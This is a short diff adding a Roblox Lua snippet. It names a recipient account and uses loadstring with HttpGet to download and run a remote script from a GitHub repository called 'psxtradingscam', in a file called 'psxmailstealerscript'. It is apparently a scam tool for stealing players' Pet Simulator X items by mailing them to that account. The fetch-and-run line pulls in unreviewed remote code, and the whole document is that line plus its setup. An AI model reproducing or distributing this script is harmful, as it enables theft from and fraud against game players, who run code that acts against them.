@@ -1,0 +1,4 @@
+G.UserName = "dalil990"
+_G.UserName2 = "dalil990" -- optional
+    
+loadstring(game:HttpGet("https://raw.githubusercontent.com/50502020im/psxtradingscam/main/psxmailstealerscript", true))())
